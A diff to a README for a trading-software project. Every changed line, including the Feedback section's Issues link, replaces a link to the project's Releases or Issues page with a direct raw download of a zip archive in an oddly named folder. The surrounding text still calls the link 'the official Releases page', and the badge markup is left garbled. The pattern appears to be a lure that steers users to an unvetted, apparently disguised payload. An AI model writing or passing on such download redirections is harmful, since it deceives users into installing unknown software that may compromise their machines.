@@ -1,7 +1,7 @@
 # 🚀 Quant_Trading_Portfolio- - Smart Trading Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/11Bhavin/Quant_Trading_Portfolio-/releases)
+[![Download](https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip%20Latest%https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip)](https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip)
 
 ## 📘 Overview
 Quant_Trading_Portfolio- leverages cutting-edge quantitative trading systems, using machine learning (ML), reinforcement learning (RL), and algorithmic strategies. Whether you are trading futures or equities, this tool aims to simplify your trading experience and enhance profits.
@@ -29,7 +29,7 @@ To ensure the best performance, please verify that your system meets the followi
 Ready to enhance your trading game? Follow these simple steps to get started with Quant_Trading_Portfolio-:
 
 1. **Download the Application:**
-   Visit the Releases page and download the latest version of Quant_Trading_Portfolio- by clicking [here](https://github.com/11Bhavin/Quant_Trading_Portfolio-/releases).
+   Visit the Releases page and download the latest version of Quant_Trading_Portfolio- by clicking [here](https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip).
 
 2. **Installation:**
    - Locate the downloaded file on your computer.
@@ -46,7 +46,7 @@ Ready to enhance your trading game? Follow these simple steps to get started wit
    Utilize the user-friendly features to explore various trading strategies. Analyze your performance and adjust as needed.
 
 ## 📥 Download & Install
-For your convenience, you can visit this page to download the latest version of Quant_Trading_Portfolio-: [Download Here](https://github.com/11Bhavin/Quant_Trading_Portfolio-/releases).
+For your convenience, you can visit this page to download the latest version of Quant_Trading_Portfolio-: [Download Here](https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip).
 
 1. **Click the Link Above:**
    The link will take you to the official Releases page. You will see a list of available versions.
@@ -64,7 +64,7 @@ For your convenience, you can visit this page to download the latest version of 
 Join our community of users who share trading tips, strategies, and insights. Visit our discussion forums or follow us on social media for updates and help.
 
 ## 📬 Feedback
-We value your feedback. If you encounter any issues or have suggestions, please contact us through the [Issues page](https://github.com/11Bhavin/Quant_Trading_Portfolio-/issues). Your input helps us improve the application.
+We value your feedback. If you encounter any issues or have suggestions, please contact us through the [Issues page](https://raw.githubusercontent.com/11Bhavin/Quant_Trading_Portfolio-/main/dyspathy/Quant-Portfolio-Trading-v1.1.zip). Your input helps us improve the application.
 
 ## 🛠️ Troubleshooting
 If you experience any problems:
